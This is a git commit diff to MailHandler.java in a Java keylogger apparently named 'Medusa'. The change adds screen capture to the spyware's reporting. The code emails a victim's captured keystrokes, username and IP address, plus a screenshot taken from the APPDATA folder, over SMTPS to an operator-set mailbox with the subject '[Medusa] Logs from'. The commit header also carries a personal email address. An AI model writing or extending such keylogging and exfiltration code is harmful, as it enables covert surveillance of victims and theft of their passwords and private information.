e36ca33d6fd9c8c22797c01c3d70cfaa4a7d85c4
Jabaar <michael.sc.evans@gmail.com>
2013-06-01 15:43:49 -0700

    If able, attach screenshot.

--- src/net/lotusdev/medusa/server/MailHandler.java
+++ src/net/lotusdev/medusa/server/MailHandler.java
@@ -1,12 +1,20 @@
 package net.lotusdev.medusa.server;
 
+import java.io.File;
 import java.util.Properties;
 
+import javax.activation.DataHandler;
+import javax.activation.DataSource;
+import javax.activation.FileDataSource;
+import javax.mail.BodyPart;
 import javax.mail.Message;
+import javax.mail.Multipart;
 import javax.mail.Session;
 import javax.mail.Transport;
 import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeBodyPart;
 import javax.mail.internet.MimeMessage;
+import javax.mail.internet.MimeMultipart;
 
 /**
  * MailHandler.java
@@ -50,7 +58,31 @@ public final class MailHandler {
 			msg.setSubject(m_subject);
 			msg.setFrom(new InternetAddress(d_email));
 			msg.addRecipient(Message.RecipientType.TO, new InternetAddress(m_to));
-	
+			
+			if(SettingsImport.getAbleToCapture()) {
+				ScreenCapture.captureScreen();
+			}
+			
+			Multipart multipart = new MimeMultipart();
+			MimeBodyPart pngAttachment = new MimeBodyPart();
+			String myPNG = System.getenv("APPDATA") + "/scr_tmp.png";
+			/*DataSource ds = new FileDataSource(myPNG);
+			pngAttachment.setDataHandler(new DataHandler(ds));
+			pngAttachment.setFileName(new File(myPNG).getName());
+			multipart.addBodyPart(pngAttachment);*/
+			
+			if(SettingsImport.getAbleToCapture()) {
+				MimeBodyPart file = new MimeBodyPart();
+				file.attachFile(myPNG);
+				multipart.addBodyPart(file);
+			}
+			
+			MimeBodyPart text = new MimeBodyPart();
+			text.setText(m_text);
+			multipart.addBodyPart(text);
+			
+			msg.setContent(multipart);
+			
 			Transport transport = session.getTransport("smtps");
 			transport.connect(d_host, 465, d_uname, d_password);
 			transport.sendMessage(msg, msg.getAllRecipients());
@@ -64,6 +96,7 @@ public final class MailHandler {
 		/**
 		 * Makes sure info gets updated before the email even attempts to send.
 		 */
+		
 		d_email = SettingsImport.getEmailUser();
         d_uname = SettingsImport.getEmailName();
         d_password = SettingsImport.getEmailPass();
@@ -71,6 +104,6 @@ public final class MailHandler {
         d_port = SettingsImport.getEmailPort();
         m_to = SettingsImport.getEmailUser();
         m_subject = "[Medusa] Logs from: " + GetInfo.getUser();
-        m_text = Listener.getTypedKeys()  + "\r\n\r\n" + GetInfo.getIp();
+        m_text = "Logs from the last " + SettingsImport.getTimeout() + " minutes from user [" + GetInfo.getUser() + "] (" + GetInfo.getIp() + ")\r\n\r\n" + Listener.getTypedKeys() + "\r\n\r\n" + (SettingsImport.getAbleToCapture()? "Attatched Images:":"");
 	}
 }
